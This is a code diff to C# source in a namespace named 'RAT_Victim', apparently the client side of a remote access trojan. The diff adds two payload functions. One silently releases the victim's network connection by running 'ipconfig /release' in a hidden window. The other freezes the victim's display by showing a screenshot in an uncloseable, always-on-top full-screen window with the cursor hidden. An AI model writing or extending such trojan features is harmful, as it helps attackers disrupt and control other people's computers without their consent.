@@ -4,6 +4,7 @@ using System.IO;
 using System.Media;
 using System.Text;
 using System.Windows.Forms;
+using Timer = System.Windows.Forms.Timer;
 
 namespace RAT_Victim
 {
@@ -65,6 +66,59 @@ namespace RAT_Victim
         {
             Player.Stream = audioStream;
             Player.Play();
+        }
+
+        public static void DisableWiFi()
+        {
+            var process = new Process();
+            var info = process.StartInfo;
+            info.FileName = "ipconfig";
+            info.Arguments = "/release";
+            info.WindowStyle = ProcessWindowStyle.Hidden;
+            process.Start();
+        }
+
+        public static void Lag()
+        {
+            var canClose = false;
+            var screenSize = Screen.PrimaryScreen.Bounds.Size;
+            var bitmap = new Bitmap(screenSize.Width, screenSize.Height);
+            var graphics = Graphics.FromImage(bitmap);
+            graphics.CopyFromScreen(0, 0, 0, 0, screenSize);
+            WinApi.GetCursorPos(out var point);
+            var cursorSize = Cursor.Current.Size;
+            Cursors.Arrow.Draw(graphics, new Rectangle(point.X, point.Y, cursorSize.Width, cursorSize.Height));
+
+            var form = new Form
+            {
+                FormBorderStyle = FormBorderStyle.None,
+                WindowState = FormWindowState.Maximized,
+                ShowIcon = false,
+                TopMost = true,
+            };
+
+            form.Load += (sender, args) =>
+            {
+                Cursor.Hide();
+                var timer = new Timer { Interval = 5000 };
+                timer.Tick += (o, eventArgs) =>
+                {
+                    canClose = true;
+                    form.Close();
+                };
+                timer.Start();
+            };
+
+            form.FormClosing += (sender, args) => args.Cancel = !canClose;
+
+            var pictureBox = new PictureBox
+            {
+                Image = bitmap,
+                Dock = DockStyle.Fill
+            };
+
+            form.Controls.Add(pictureBox);
+            Application.Run(form);
         }
     }
 }
